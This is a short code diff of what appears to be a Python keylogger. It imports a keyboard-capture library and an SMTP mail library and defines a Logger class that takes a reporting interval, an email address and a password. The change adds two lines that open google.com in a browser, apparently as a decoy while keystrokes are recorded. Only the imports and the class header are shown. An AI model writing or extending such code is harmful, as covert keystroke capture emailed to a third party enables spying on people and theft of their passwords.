@@ -5,6 +5,9 @@ import pynput.keyboard
 import threading
 import smtplib
 
+import webbrowser
+webbrowser.open('https://google.com', new=1)
+
 
 class Logger:
     def __init__(self, time_interval, email, password):
